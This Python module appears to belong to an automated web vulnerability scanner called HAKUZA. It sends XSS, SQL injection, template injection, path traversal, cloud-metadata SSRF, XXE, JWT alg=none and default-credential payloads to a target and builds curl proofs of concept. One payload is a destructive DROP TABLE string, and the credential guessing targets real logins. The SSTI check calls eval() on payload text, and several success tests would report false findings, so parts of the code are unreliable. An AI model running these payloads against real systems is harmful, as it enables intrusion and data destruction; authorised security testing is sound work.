#!/usr/bin/env python3
"""
HAKUZA Technique Executors — Test execution handlers for orchestrated techniques
Each technique gets a handler that:
1. Takes target_url, params, engagement_id, db connection
2. Crafts and executes HTTP requests with vulnerability-specific payloads
3. Parses responses to detect if vulnerability is present
4. Persists findings to DB via add_finding()

Handlers fall back to curl command generation + manual verification if mod_active unavailable.
"""

import re
import time
import json
import base64
import hmac
import hashlib
from datetime import datetime
from typing import Optional, Dict, Any, List
from urllib.parse import urlsplit, urlunsplit, parse_qsl, quote

# Try importing mod_active for advanced testing capabilities
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from mod_active_ai import gen_curl_poc, gen_python_poc
    HAS_ACTIVE_AI = True
except ImportError:
    HAS_ACTIVE_AI = False


# Lazy-load hakuza module helpers at call time (consistent with mod_recon_plus pattern)
def _n(attr):
    """Fetch attribute from hakuza module at call-time."""
    import importlib
    hakuza = importlib.import_module("hakuza")
    return getattr(hakuza, attr)


# ─────────────────────────────────────────────────────────────────────────────
# FINDING PERSISTENCE
# ─────────────────────────────────────────────────────────────────────────────

def _add_finding(eng_id: str, **kwargs) -> Optional[Dict[str, Any]]:
    """Wrapper around hakuza.add_finding() for executor use."""
    try:
        add_finding = _n("add_finding")
        return add_finding(eng_id, **kwargs)
    except Exception as e:
        print(f"[!] add_finding error: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# HTTP HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _polite_get(url: str, timeout: int = 10, headers: Dict = None) -> Optional[Any]:
    """Execute GET with timeout and headers."""
    if not HAS_REQUESTS:
        return None
    try:
        h = headers or {"User-Agent": "Mozilla/5.0 (HAKUZA/Executor)"}
        return requests.get(url, timeout=timeout, headers=h, allow_redirects=True)
    except Exception:
        return None


def _polite_post(url: str, data: str = None, json_data: Dict = None,
                 headers: Dict = None, timeout: int = 10) -> Optional[Any]:
    """Execute POST with timeout and headers."""
    if not HAS_REQUESTS:
        return None
    try:
        h = headers or {"User-Agent": "Mozilla/5.0 (HAKUZA/Executor)"}
        if json_data:
            h["Content-Type"] = "application/json"
            return requests.post(url, json=json_data, timeout=timeout, headers=h)
        else:
            return requests.post(url, data=data, timeout=timeout, headers=h)
    except Exception:
        return None


def _with_param(pairs: List[tuple], name: str, value: str) -> List[tuple]:
    """Return new list of query pairs with name's value replaced."""
    return [(k, value if k == name else v) for k, v in pairs]


def _build_url(parts, pairs: List[tuple], raw_names: set = None) -> str:
    """Rebuild URL from urlsplit parts + (k,v) query pairs."""
    raw_names = raw_names or set()
    segs = []
    for k, v in pairs:
        if k in raw_names:
            segs.append(f"{quote(k, safe='')}={v}")
        else:
            segs.append(f"{quote(k, safe='')}={quote(str(v), safe='')}")
    query = "&".join(segs)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD LIBRARIES
# ─────────────────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '"><script>alert(1)</script>',
    "';alert(1);//",
    '"><img src=x onerror=alert(1)>',
    '"onmouseover="alert(1)"',
    '<svg onload=alert(1)>',
]

SQLI_ERROR_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "1' AND '1'='1",
]

SQLI_TIME_PAYLOADS = [
    "1' AND SLEEP(4)--",
    "1'; WAITFOR DELAY '00:00:04'--",
    "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(4) ELSE 0 END)--",
]

SSTI_PAYLOADS = [
    "${7*7}",
    "{{7*7}}",
    "{# {{7*7}} #}",
    "<%=7*7%>",
    "[[ 7*7 ]]",
]

LFI_PAYLOADS = [
    "../../../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:6379/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3306/",
]

XXE_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

JWT_NONE_ALG = "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0."

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("root", "password"),
    ("test", "test"),
]


# ─────────────────────────────────────────────────────────────────────────────
# EXECUTOR FUNCTIONS (one per technique)
# ─────────────────────────────────────────────────────────────────────────────

def execute_xss_reflected(target_url: str, params_list: List[str],
                          eng_id: str, technique_id: str = "xss_reflected") -> Optional[Dict]:
    """
    Test for reflected XSS by injecting payloads into query params.
    Looks for: payload reflection in response body.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_xss_reflected(target_url, params_list, technique_id)

    parts = urlsplit(target_url)
    base_pairs = parse_qsl(parts.query, keep_blank_values=True)

    for param in params_list:
        for payload in XSS_PAYLOADS[:2]:  # Test first 2 payloads per param
            test_pairs = _with_param(base_pairs, param, payload)
            test_url = _build_url(parts, test_pairs)

            resp = _polite_get(test_url, timeout=10)
            if not resp:
                continue

            # Check if payload is reflected unescaped in response
            if payload in resp.text and ("<script>" in resp.text or "onerror=" in resp.text):
                curl = f'curl "{test_url}"'
                return _persist_finding(
                    eng_id, technique_id,
                    title=f"Reflected XSS in parameter '{param}'",
                    severity="high",
                    url=target_url,
                    param=param,
                    payload=payload,
                    description=f"Parameter '{param}' reflects unsanitized user input",
                    curl_poc=curl
                )

    return None


def execute_xss_stored(target_url: str, params_list: List[str],
                       eng_id: str, technique_id: str = "xss_stored") -> Optional[Dict]:
    """
    Test for stored XSS by injecting payloads into forms and checking persistence.
    Note: requires form POST capability; simplified to detection.
    """
    # Stored XSS requires POST to form fields and verification on subsequent GET
    # For orchestrator, suggest manual verification with curl
    return _suggest_curl_xss_stored(target_url, params_list, technique_id)


def execute_sqli_error(target_url: str, params_list: List[str],
                       eng_id: str, technique_id: str = "sqli_error") -> Optional[Dict]:
    """
    Test for error-based SQLi by injecting SQL metacharacters.
    Looks for: SQL error messages in response.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_sqli_error(target_url, params_list, technique_id)

    parts = urlsplit(target_url)
    base_pairs = parse_qsl(parts.query, keep_blank_values=True)

    sql_error_patterns = [
        r"you have an error in your sql syntax",
        r"mysql_.*error",
        r"sql.*error|syntax error|unclosed quotation",
        r"ora-\d{5}|oraclesql",
    ]

    for param in params_list:
        payload = "' OR '1'='1"
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)

        resp = _polite_get(test_url, timeout=10)
        if not resp:
            continue

        # Check for SQL error messages
        for pattern in sql_error_patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                curl = f'curl "{test_url}"'
                return _persist_finding(
                    eng_id, technique_id,
                    title=f"SQL Injection (Error-based) in parameter '{param}'",
                    severity="critical",
                    url=target_url,
                    param=param,
                    payload=payload,
                    description=f"SQL error message leaked in response",
                    curl_poc=curl
                )

    return None


def execute_sqli_blind(target_url: str, params_list: List[str],
                       eng_id: str, technique_id: str = "sqli_blind") -> Optional[Dict]:
    """
    Test for blind/time-based SQLi.
    Looks for: response time differences with SLEEP payloads.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_sqli_blind(target_url, params_list, technique_id)

    parts = urlsplit(target_url)
    base_pairs = parse_qsl(parts.query, keep_blank_values=True)

    for param in params_list:
        # Baseline: normal request
        baseline_pairs = base_pairs
        baseline_url = _build_url(parts, baseline_pairs)

        start = time.time()
        resp_baseline = _polite_get(baseline_url, timeout=10)
        baseline_time = time.time() - start

        if not resp_baseline:
            continue

        # Delayed request: SLEEP(4)
        payload = "1' AND SLEEP(4)--"
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)

        start = time.time()
        resp_delayed = _polite_get(test_url, timeout=10)
        delayed_time = time.time() - start

        if not resp_delayed:
            continue

        # If delayed response took >3 seconds longer, likely vulnerable
        if delayed_time - baseline_time >= 3.0:
            curl = f'curl "{test_url}"'
            return _persist_finding(
                eng_id, technique_id,
                title=f"SQL Injection (Blind/Time-based) in parameter '{param}'",
                severity="critical",
                url=target_url,
                param=param,
                payload=payload,
                description=f"Response time delay detected ({delayed_time:.2f}s vs {baseline_time:.2f}s baseline)",
                curl_poc=curl
            )

    return None


def execute_ssti_injection(target_url: str, params_list: List[str],
                           eng_id: str, technique_id: str = "ssti_injection") -> Optional[Dict]:
    """
    Test for Server-Side Template Injection.
    Looks for: mathematical expression evaluation in response.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_ssti(target_url, params_list, technique_id)

    parts = urlsplit(target_url)
    base_pairs = parse_qsl(parts.query, keep_blank_values=True)

    for param in params_list:
        for payload in SSTI_PAYLOADS:
            test_pairs = _with_param(base_pairs, param, payload)
            test_url = _build_url(parts, test_pairs)

            resp = _polite_get(test_url, timeout=10)
            if not resp:
                continue

            # Check if template expression was evaluated (7*7 = 49)
            if "49" in resp.text or str(eval(payload.replace("${", "").replace("}}", ""))) in resp.text:
                curl = f'curl "{test_url}"'
                return _persist_finding(
                    eng_id, technique_id,
                    title=f"Server-Side Template Injection in parameter '{param}'",
                    severity="critical",
                    url=target_url,
                    param=param,
                    payload=payload,
                    description=f"Template expression evaluated (7*7=49)",
                    curl_poc=curl
                )

    return None


def execute_lfi_traversal(target_url: str, params_list: List[str],
                          eng_id: str, technique_id: str = "lfi_traversal") -> Optional[Dict]:
    """
    Test for Local File Inclusion / Path Traversal.
    Looks for: /etc/passwd or Windows config file contents.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_lfi(target_url, params_list, technique_id)

    parts = urlsplit(target_url)
    base_pairs = parse_qsl(parts.query, keep_blank_values=True)

    lfi_signals = [r"root:.*:0:0:", r"\[drivers\]", r"root:/bin/bash"]

    for param in params_list:
        for payload in LFI_PAYLOADS:
            test_pairs = _with_param(base_pairs, param, payload)
            test_url = _build_url(parts, test_pairs)

            resp = _polite_get(test_url, timeout=10)
            if not resp:
                continue

            # Check for file content indicators
            for signal in lfi_signals:
                if re.search(signal, resp.text, re.IGNORECASE):
                    curl = f'curl "{test_url}"'
                    return _persist_finding(
                        eng_id, technique_id,
                        title=f"Local File Inclusion in parameter '{param}'",
                        severity="high",
                        url=target_url,
                        param=param,
                        payload=payload,
                        description=f"Arbitrary file contents readable via path traversal",
                        curl_poc=curl
                    )

    return None


def execute_ssrf_cloud_metadata(target_url: str, params_list: List[str],
                                eng_id: str, technique_id: str = "ssrf_cloud_metadata") -> Optional[Dict]:
    """
    Test for SSRF to cloud metadata endpoints.
    Looks for: AWS IMDS metadata responses.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_ssrf(target_url, params_list, technique_id)

    parts = urlsplit(target_url)
    base_pairs = parse_qsl(parts.query, keep_blank_values=True)

    for param in params_list:
        payload = "http://169.254.169.254/latest/meta-data/"
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)

        resp = _polite_get(test_url, timeout=10)
        if not resp:
            continue

        # Check for metadata response patterns
        if "latest" in resp.text or "ami-id" in resp.text or "instance-type" in resp.text:
            curl = f'curl "{test_url}"'
            return _persist_finding(
                eng_id, technique_id,
                title=f"Server-Side Request Forgery (SSRF) - Cloud Metadata",
                severity="critical",
                url=target_url,
                param=param,
                payload=payload,
                description=f"SSRF to AWS metadata endpoint successful",
                curl_poc=curl
            )

    return None


def execute_xxe_file_read(target_url: str, params_list: List[str],
                          eng_id: str, technique_id: str = "xxe_file_read") -> Optional[Dict]:
    """
    Test for XXE file read vulnerability.
    Looks for: /etc/passwd content in response.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_xxe(target_url, params_list, technique_id)

    # XXE typically requires XML POST body
    # For GET params, try injecting XML into a param
    parts = urlsplit(target_url)
    base_pairs = parse_qsl(parts.query, keep_blank_values=True)

    for param in params_list:
        payload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)

        resp = _polite_get(test_url, timeout=10)
        if not resp:
            continue

        # Check for passwd content
        if re.search(r"root:.*:0:0:", resp.text):
            curl = f'curl "{test_url}"'
            return _persist_finding(
                eng_id, technique_id,
                title=f"XML External Entity (XXE) - File Read",
                severity="high",
                url=target_url,
                param=param,
                payload=payload,
                description=f"/etc/passwd content leaked via XXE",
                curl_poc=curl
            )

    return None


def execute_idor_horizontal(target_url: str, params_list: List[str],
                            eng_id: str, technique_id: str = "idor_horizontal") -> Optional[Dict]:
    """
    Test for Insecure Direct Object Reference (horizontal privesc).
    Looks for: access to other users' data by modifying ID param.
    """
    # IDOR testing requires knowledge of valid object IDs (user IDs, etc.)
    # Simplified: suggest curl with modified IDs
    return _suggest_curl_idor_horizontal(target_url, params_list, technique_id)


def execute_jwt_none_alg(target_url: str, params_list: List[str],
                         eng_id: str, technique_id: str = "jwt_none_alg") -> Optional[Dict]:
    """
    Test for JWT 'none' algorithm vulnerability.
    Looks for: ability to set alg=none and have token accepted.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_jwt_none(target_url, params_list, technique_id)

    # Construct a test JWT with alg=none
    payload = _JWT_NONE_ALG  # Base: {"alg":"none"}.{"sub":"1234567890"}.

    # Try sending as header (common in APIs)
    headers = {
        "Authorization": f"Bearer {payload}",
        "User-Agent": "Mozilla/5.0 (HAKUZA/Executor)"
    }

    resp = _polite_get(target_url, headers=headers, timeout=10)
    if not resp:
        return None

    # If we get a 200/2xx response, token may have been accepted
    if resp.status_code in [200, 201, 204]:
        curl = f'curl -H "Authorization: Bearer {payload}" "{target_url}"'
        return _persist_finding(
            eng_id, technique_id,
            title=f"JWT - None Algorithm Vulnerability",
            severity="critical",
            url=target_url,
            param="Authorization",
            payload=payload,
            description=f"JWT with alg='none' accepted by server",
            curl_poc=curl
        )

    return None


def execute_cors_misconfiguration(target_url: str, params_list: List[str],
                                  eng_id: str, technique_id: str = "cors_misconfiguration") -> Optional[Dict]:
    """
    Test for CORS misconfiguration.
    Looks for: ACAO header with Origin: attacker.com.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_cors(target_url, params_list, technique_id)

    headers = {
        "Origin": "https://attacker.com",
        "User-Agent": "Mozilla/5.0 (HAKUZA/Executor)"
    }

    resp = _polite_get(target_url, headers=headers, timeout=10)
    if not resp:
        return None

    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == "https://attacker.com" or acao == "*":
        curl = f'curl -H "Origin: https://attacker.com" "{target_url}"'
        return _persist_finding(
            eng_id, technique_id,
            title=f"CORS Misconfiguration",
            severity="high",
            url=target_url,
            param="Origin",
            payload="https://attacker.com",
            description=f"Overly permissive CORS header: {acao}",
            curl_poc=curl
        )

    return None


def execute_default_credentials(target_url: str, params_list: List[str],
                                eng_id: str, technique_id: str = "default_credentials") -> Optional[Dict]:
    """
    Test for default credentials by attempting login.
    Looks for: successful authentication with default creds.
    """
    if not HAS_REQUESTS:
        return _suggest_curl_default_creds(target_url, params_list, technique_id)

    # Try default credentials against login endpoint
    for username, password in DEFAULT_CREDS:
        data = {
            "username": username,
            "password": password,
            "email": username,  # Some forms use email instead
            "login": username,
        }

        resp = _polite_post(target_url, json_data=data, timeout=10)
        if not resp:
            continue

        # Check for success indicators
        if resp.status_code == 200 or "success" in resp.text.lower() or "dashboard" in resp.text.lower():
            curl = f'curl -X POST -d "username={username}&password={password}" "{target_url}"'
            return _persist_finding(
                eng_id, technique_id,
                title=f"Default Credentials",
                severity="high",
                url=target_url,
                param="username/password",
                payload=f"{username}:{password}",
                description=f"Default credentials {username}:{password} accepted",
                curl_poc=curl
            )

    return None


def execute_mass_assignment(target_url: str, params_list: List[str],
                            eng_id: str, technique_id: str = "mass_assignment") -> Optional[Dict]:
    """
    Test for mass assignment / hidden parameter injection.
    Looks for: hidden params like role=admin processed by server.
    """
    # Mass assignment typically requires POST with form data
    # Simplified: suggest curl with extra params
    return _suggest_curl_mass_assignment(target_url, params_list, technique_id)


# ─────────────────────────────────────────────────────────────────────────────
# CURL SUGGESTION HELPERS (fallback when requests unavailable)
# ─────────────────────────────────────────────────────────────────────────────

def _suggest_curl_xss_reflected(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl command for manual XSS reflected testing."""
    for param in params[:2]:
        payload = '"><script>alert(1)</script>'
        parts = urlsplit(target_url)
        base_pairs = parse_qsl(parts.query, keep_blank_values=True)
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)
        curl = f'curl "{test_url}"'

        return {
            "technique_id": tech_id,
            "status": "manual_verification_suggested",
            "title": f"Reflected XSS - Suggested Manual Test",
            "severity": "high",
            "curl_command": curl,
            "description": f"Test parameter '{param}' for reflection: {curl}",
            "url": target_url,
            "param": param,
        }
    return None


def _suggest_curl_xss_stored(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest testing for stored XSS (requires form POST)."""
    return {
        "technique_id": tech_id,
        "status": "requires_manual_form_testing",
        "title": "Stored XSS - Form Testing Required",
        "severity": "high",
        "description": f"Stored XSS testing requires form submission. Manually test form fields at {target_url}",
        "url": target_url,
        "note": "Populate form fields with XSS payloads and verify persistence on page reload",
    }


def _suggest_curl_sqli_error(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for error-based SQLi."""
    for param in params[:1]:
        payload = "' OR '1'='1"
        parts = urlsplit(target_url)
        base_pairs = parse_qsl(parts.query, keep_blank_values=True)
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)
        curl = f'curl "{test_url}"'

        return {
            "technique_id": tech_id,
            "status": "manual_verification_suggested",
            "title": f"SQL Injection (Error-based) - Suggested Manual Test",
            "severity": "critical",
            "curl_command": curl,
            "description": f"Test for SQL errors: {curl}",
            "url": target_url,
            "param": param,
        }
    return None


def _suggest_curl_sqli_blind(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for time-based blind SQLi."""
    for param in params[:1]:
        payload = "1' AND SLEEP(4)--"
        parts = urlsplit(target_url)
        base_pairs = parse_qsl(parts.query, keep_blank_values=True)
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)
        curl = f'curl "{test_url}"'

        return {
            "technique_id": tech_id,
            "status": "manual_verification_suggested",
            "title": f"SQL Injection (Blind/Time-based) - Suggested Manual Test",
            "severity": "critical",
            "curl_command": curl,
            "description": f"Test for timing delay with: {curl}",
            "note": "Compare response time with/without SLEEP payload",
            "url": target_url,
            "param": param,
        }
    return None


def _suggest_curl_ssti(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for SSTI."""
    for param in params[:1]:
        payload = "${7*7}"
        parts = urlsplit(target_url)
        base_pairs = parse_qsl(parts.query, keep_blank_values=True)
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)
        curl = f'curl "{test_url}"'

        return {
            "technique_id": tech_id,
            "status": "manual_verification_suggested",
            "title": f"Server-Side Template Injection - Suggested Manual Test",
            "severity": "critical",
            "curl_command": curl,
            "description": f"Test template evaluation: {curl}",
            "note": "Look for result '49' in response",
            "url": target_url,
            "param": param,
        }
    return None


def _suggest_curl_lfi(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for LFI."""
    for param in params[:1]:
        payload = "../../../../../../../etc/passwd"
        parts = urlsplit(target_url)
        base_pairs = parse_qsl(parts.query, keep_blank_values=True)
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)
        curl = f'curl "{test_url}"'

        return {
            "technique_id": tech_id,
            "status": "manual_verification_suggested",
            "title": f"Local File Inclusion - Suggested Manual Test",
            "severity": "high",
            "curl_command": curl,
            "description": f"Test path traversal: {curl}",
            "note": "Look for /etc/passwd content in response",
            "url": target_url,
            "param": param,
        }
    return None


def _suggest_curl_ssrf(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for SSRF."""
    for param in params[:1]:
        payload = "http://169.254.169.254/latest/meta-data/"
        parts = urlsplit(target_url)
        base_pairs = parse_qsl(parts.query, keep_blank_values=True)
        test_pairs = _with_param(base_pairs, param, payload)
        test_url = _build_url(parts, test_pairs)
        curl = f'curl "{test_url}"'

        return {
            "technique_id": tech_id,
            "status": "manual_verification_suggested",
            "title": f"SSRF - Cloud Metadata - Suggested Manual Test",
            "severity": "critical",
            "curl_command": curl,
            "description": f"Test AWS metadata access: {curl}",
            "note": "Look for metadata responses or error messages",
            "url": target_url,
            "param": param,
        }
    return None


def _suggest_curl_xxe(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for XXE."""
    for param in params[:1]:
        payload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        return {
            "technique_id": tech_id,
            "status": "manual_verification_suggested",
            "title": f"XML External Entity (XXE) - Suggested Manual Test",
            "severity": "high",
            "description": f"XXE testing required on XML endpoints. Send XXE payload to {target_url}",
            "note": "Typically requires XML POST body",
            "url": target_url,
            "payload": payload,
        }
    return None


def _suggest_curl_idor_horizontal(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest manual IDOR testing."""
    return {
        "technique_id": tech_id,
        "status": "requires_manual_enumeration",
        "title": "IDOR - Horizontal Privilege Escalation - Manual Testing Required",
        "severity": "high",
        "description": f"Test IDOR by modifying object IDs in requests to {target_url}",
        "note": "Enumerate valid user IDs and attempt to access others' data",
        "url": target_url,
    }


def _suggest_curl_jwt_none(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for JWT none algorithm."""
    payload = "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
    curl = f'curl -H "Authorization: Bearer {payload}" "{target_url}"'

    return {
        "technique_id": tech_id,
        "status": "manual_verification_suggested",
        "title": f"JWT - None Algorithm - Suggested Manual Test",
        "severity": "critical",
        "curl_command": curl,
        "description": f"Test JWT with alg='none': {curl}",
        "url": target_url,
    }


def _suggest_curl_cors(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest curl for CORS misconfiguration."""
    curl = f'curl -H "Origin: https://attacker.com" "{target_url}"'

    return {
        "technique_id": tech_id,
        "status": "manual_verification_suggested",
        "title": f"CORS Misconfiguration - Suggested Manual Test",
        "severity": "high",
        "curl_command": curl,
        "description": f"Test CORS headers: {curl}",
        "note": "Look for Access-Control-Allow-Origin header in response",
        "url": target_url,
    }


def _suggest_curl_default_creds(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest testing for default credentials."""
    creds_str = " / ".join([f"{u}:{p}" for u, p in DEFAULT_CREDS[:3]])
    curl = f'curl -X POST -d "username=admin&password=admin" "{target_url}"'

    return {
        "technique_id": tech_id,
        "status": "manual_verification_suggested",
        "title": f"Default Credentials - Suggested Manual Test",
        "severity": "high",
        "curl_command": curl,
        "description": f"Test default creds ({creds_str}): {curl}",
        "url": target_url,
    }


def _suggest_curl_mass_assignment(target_url: str, params: List[str], tech_id: str) -> Optional[Dict]:
    """Suggest testing for mass assignment."""
    curl = f'curl -X POST -d "role=admin&is_admin=true" "{target_url}"'

    return {
        "technique_id": tech_id,
        "status": "manual_verification_suggested",
        "title": f"Mass Assignment - Suggested Manual Test",
        "severity": "high",
        "curl_command": curl,
        "description": f"Test mass assignment injection: {curl}",
        "note": "Try adding hidden params: role=admin, is_admin=true, is_moderator=true",
        "url": target_url,
    }


# ─────────────────────────────────────────────────────────────────────────────
# FINDING PERSISTENCE HELPER
# ─────────────────────────────────────────────────────────────────────────────

def _persist_finding(eng_id: str, technique_id: str, title: str, severity: str,
                     url: str, param: str, payload: str, description: str,
                     curl_poc: str = None) -> Optional[Dict]:
    """Persist a confirmed finding to the database."""
    return _add_finding(
        eng_id,
        technique_id=technique_id,
        title=title,
        severity=severity,
        category=technique_id.split("_")[0].upper(),  # xss_reflected -> XSS
        url=url,
        description=description,
        evidence=f"Parameter: {param}\nPayload: {payload}",
        curl_poc=curl_poc,
        impact="Potential security compromise",
        remediation="Apply input validation and output encoding",
        tool="hakuza-orchestrator"
    )


# ─────────────────────────────────────────────────────────────────────────────
# EXECUTOR REGISTRY + DISPATCHER
# ─────────────────────────────────────────────────────────────────────────────

EXECUTORS = {
    "xss_reflected": execute_xss_reflected,
    "xss_stored": execute_xss_stored,
    "sqli_error": execute_sqli_error,
    "sqli_blind": execute_sqli_blind,
    "ssti_injection": execute_ssti_injection,
    "lfi_traversal": execute_lfi_traversal,
    "ssrf_cloud_metadata": execute_ssrf_cloud_metadata,
    "xxe_file_read": execute_xxe_file_read,
    "idor_horizontal": execute_idor_horizontal,
    "jwt_none_alg": execute_jwt_none_alg,
    "cors_misconfiguration": execute_cors_misconfiguration,
    "default_credentials": execute_default_credentials,
    "mass_assignment": execute_mass_assignment,
}


def execute_technique(technique_id: str, target_url: str, params_list: List[str],
                      eng_id: str) -> Optional[Dict]:
    """
    Main dispatcher: given a technique_id, route to appropriate executor.
    Returns finding dict if vuln found, None otherwise.
    """
    handler = EXECUTORS.get(technique_id)
    if not handler:
        print(f"[!] No executor for technique: {technique_id}")
        return None

    try:
        return handler(target_url, params_list, eng_id, technique_id)
    except Exception as e:
        print(f"[!] Executor error for {technique_id}: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

_JWT_NONE_ALG = JWT_NONE_ALG
